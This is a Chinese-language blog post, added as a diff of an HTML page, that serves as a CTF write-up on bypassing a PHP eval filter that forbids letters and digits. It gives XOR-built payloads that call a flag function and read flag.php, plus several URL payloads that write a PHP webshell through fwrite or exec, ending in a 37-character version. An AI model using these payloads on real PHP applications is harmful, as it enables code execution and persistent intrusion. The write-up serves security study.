@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>纯符号shell的学习 | LTF</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="一道ctf题，看了其他大师傅的payload才搞懂了。后来试图绕过40字符写入webshell,走了一些弯路，最后只构造出一种37个字符的payload，记录一下。 题目：12345678910111213141516&amp;lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;]))&amp;#123;    $code = $_GET[&apos;code&apos;];    if(">
+<meta name="keywords" content="PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="纯符号shell的学习">
+<meta property="og:url" content="https://ltf.github.io/2018/08/08/shell-made-of-symbols/index.html">
+<meta property="og:site_name" content="LTF">
+<meta property="og:description" content="一道ctf题，看了其他大师傅的payload才搞懂了。后来试图绕过40字符写入webshell,走了一些弯路，最后只构造出一种37个字符的payload，记录一下。 题目：12345678910111213141516&amp;lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;]))&amp;#123;    $code = $_GET[&apos;code&apos;];    if(">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-01-29T09:54:27.987Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="纯符号shell的学习">
+<meta name="twitter:description" content="一道ctf题，看了其他大师傅的payload才搞懂了。后来试图绕过40字符写入webshell,走了一些弯路，最后只构造出一种37个字符的payload，记录一下。 题目：12345678910111213141516&amp;lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;]))&amp;#123;    $code = $_GET[&apos;code&apos;];    if(">
+  
+    <link rel="alternate" href="/atom.xml" title="LTF" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">LTF</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://ltf.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-shell-made-of-symbols" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/08/08/shell-made-of-symbols/" class="article-date">
+  <time datetime="2018-08-08T14:47:46.000Z" itemprop="datePublished">2018-08-08</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/LTF/">LTF</a>►<a class="article-category-link" href="/categories/LTF/漏断/">漏断</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      纯符号shell的学习
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a>
+<p>一道ctf题，看了其他大师傅的payload才搞懂了。后来试图绕过40字符写入webshell,走了一些弯路，最后只构造出一种37个字符的payload，记录一下。</p>
+<p>题目：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<!--more-->
+<p>题目考察PHP语言中的动态变量和可变函数、字符转化绕过</p>
+<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">     202.112.51.184:20001/?code=$_=&quot;`&#123; &#123;&#123;:^&quot;?&lt;&gt;/&quot;;$$&#123;$_&#125;[_]();</span><br></pre></td></tr></table></figure></p>
+<p>服务器解析读取变量:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;code&apos;]=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();</span><br><span class="line"></span><br><span class="line">$_GET[_]=getFlag</span><br></pre></td></tr></table></figure></p>
+<p>执行eval:</p>
+<p>字符串异或：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=_GET;</span><br></pre></td></tr></table></figure></p>
+<p>动态变量：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$_&#125; == $_GET</span><br><span class="line"></span><br><span class="line">$&#123;$_&#125;[_] == $_GET[_]</span><br></pre></td></tr></table></figure>
+<p>GET开始时读取的变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[_] == getFlag</span><br><span class="line"></span><br><span class="line">$_GET[_]() ==getFlag();</span><br></pre></td></tr></table></figure></p>
+<p>另一种payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=(&quot;:&gt;/&#125;,!&apos;&quot;^&quot;][[;@@@&quot;);$_();</span><br></pre></td></tr></table></figure></p>
+<p>同样使用动态变量，只传入一个$_GET值</p>
+<p>构造接收POST：</p>
+<p>请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">202.112.51.184:20001/?code=$_=&quot;~~`~~&quot;^&quot;!./-*&quot;;$&#123;$_&#125;[_];</span><br><span class="line"></span><br><span class="line">POST：\_=readfile(&apos;flag.php&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;code&apos;] = $_=_POST;$&#123;$_&#125;[_];</span><br><span class="line"></span><br><span class="line">$_POST[_] = readfile(&apos;flag.php&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_ = _POST;</span><br><span class="line"></span><br><span class="line">$_POST[_];</span><br></pre></td></tr></table></figure></p>
+<p>尝试写入shell一：</p>
+<p>利用代码执行通过php函数写入文件</p>
+<p>请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">202.112.51.184:20001/?code=$_=&quot;`&#123; &#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__],$&#123;$_&#125;[___]);&amp;_=fwrite&amp;__=shell.php&amp;___=&lt;?php eval($_GET[&apos;a&apos;]);</span><br></pre></td></tr></table></figure></p>
+<p>48个字符,解决了PHP函数传参问题</p>
+<p>变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;code&apos;] = $_=&quot;`&#123; &#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__],$&#123;$_&#125;[___]);</span><br><span class="line"></span><br><span class="line">$_GET[_] = fwrite</span><br><span class="line"></span><br><span class="line">$_GET[__] = shell.php</span><br><span class="line"></span><br><span class="line">$_GET[___] = &lt;?php eval($_GET[&apos;a&apos;]);</span><br></pre></td></tr></table></figure></p>
+<p>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_ = _GET;</span><br><span class="line"></span><br><span class="line">$_GET[_]($_GET[__],$_GET[___]);</span><br><span class="line"></span><br><span class="line">fwrite(&apos;shell.php&apos;,&apos;&lt;?php eval($_GET[&apos;a&apos;]);&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>尝试写入shell二：</p>
+<p>通过代码执行写入shell</p>
+<p>请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">202.112.51.184:20001/?code=$_=&apos;@)!@&apos;^&apos;%_@,&apos;;$__=&quot;`&#123; &#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;($&#123;$__&#125;[_]);&amp;_=fwrite(&apos;shell.php&apos;,&apos;&lt;?phpeval($_GET[&apos;a&apos;]);&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>49个字符，避免了函数传参问题</p>
+<p>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval($_GET[_]);</span><br></pre></td></tr></table></figure></p>
+<p>这里遇到一个php问题:<br>与phpinfo()等不同，eval()在PHP中并不是作为一个函数而存在，通过可变函数调用eval()会返回undefined function eval()</p>
+<p><a href="https://stackoverflow.com/questions/29707896/undefined-function-eval-php" target="_blank" rel="noopener">“https://stackoverflow.com/questions/29707896/undefined-function-eval-php”</a></p>
+<p>尝试写入shell三：</p>
+<p>学长说可以构造命令执行，转换思路尝试一波。</p>
+<p>换一个PHP函数调用系统命令写入shell</p>
+<p>请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">202.112.51.184:20001/?code=$_=&apos;@#@@&apos;^&apos;%\[%#&apos;;$__=&quot;`&#123; &#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;($&#123;$__&#125;[_]);&amp;_=echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure></p>
+<p>49个字符</p>
+<p>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec($_GET[_]);</span><br></pre></td></tr></table></figure></p>
+<p>尝试写入shell四：</p>
+<p>意识到想要缩短code字符串，就得尽量通过code之外的$_GET变量传入参数，依照这个思路构造了出来</p>
+<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">202.112.51.184:20001/?code=$_=&quot;`&#123; &#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=exec&amp;__=echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure></p>
+<p>37个字符，我所得到的最优解</p>
+<p>url编码后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">202.112.51.184:20001/?code=$_=%22`&#123; &#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=exec&amp;__=echo%20%22%3C?php%20phpinfo();%20?%3E%22%3Eshell.php</span><br></pre></td></tr></table></figure></p>
+<p>变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;code&apos;]= $_=&quot;`&#123; &#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;\[_]($&#123;$_&#125;[__]);</span><br><span class="line"></span><br><span class="line">$_GET[_] = exec</span><br><span class="line"></span><br><span class="line">$_GET[__] = echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure></p>
+<p>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_=_GET;</span><br><span class="line"></span><br><span class="line">$_GET[_]($_GET[__]);</span><br><span class="line"></span><br><span class="line">exec(&apos;echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; shell.php&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>梅子酒师傅部署题目时应该还做了二手准备，访问除题目外的页面都返回403，没能拿到shell，不过本地测试成功。</p>
+<p>在微信上看到有师傅连下划线都不用就实现了任意代码执行，发现自己跟师傅们的差距还是太大了，在此记录一下菜鸡对这道题的探究过程，作为备忘。</p>
+<p>参考：<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://ltf.github.io/2018/08/08/shell-made-of-symbols/" data-id="cjrhlnlqt002a4gu23alnis3o" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/12/26/hello-world/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Hello World
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/07/01/406/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Note of Unreal Engine 4</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Einstein-Turing/">Einstein_Turing</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/LTF/">LTF</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/LTF/XLor/">XLor</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/LTF/漏断/">漏断</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/LordCasser/">LordCasser</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/LordCasser/LTF/">LTF</a></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/environments/">environments</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali/">kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/学习打卡/">学习打卡</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传检测绕过/">文件上传检测绕过</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/笔记/">笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网站渗透/">网站渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/记录/">记录</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/Python/" style="font-size: 20px;">Python</a> <a href="/tags/environments/" style="font-size: 15px;">environments</a> <a href="/tags/kali/" style="font-size: 10px;">kali</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a> <a href="/tags/学习打卡/" style="font-size: 15px;">学习打卡</a> <a href="/tags/文件上传检测绕过/" style="font-size: 10px;">文件上传检测绕过</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/网站渗透/" style="font-size: 10px;">网站渗透</a> <a href="/tags/记录/" style="font-size: 10px;">记录</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/12/26/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/08/shell-made-of-symbols/">纯符号shell的学习</a>
+          </li>
+        
+          <li>
+            <a href="/2018/07/01/406/">Note of Unreal Engine 4</a>
+          </li>
+        
+          <li>
+            <a href="/2018/05/21/win10-e4-b8-8b-e7-9a-84linux-e5-ad-90-e7-b3-bb-e7-bb-9fkali-e7-9a-84-e5-ae-89-e8-a3-85-e5-8f-8a-e9-85-8d-e7-bd-ae/">win10下的linux子系统(kali)的安装及配置</a>
+          </li>
+        
+          <li>
+            <a href="/2018/05/13/assembly-language-end-example-the-date/">Assembly Language End Example——The Date</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 LTF<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
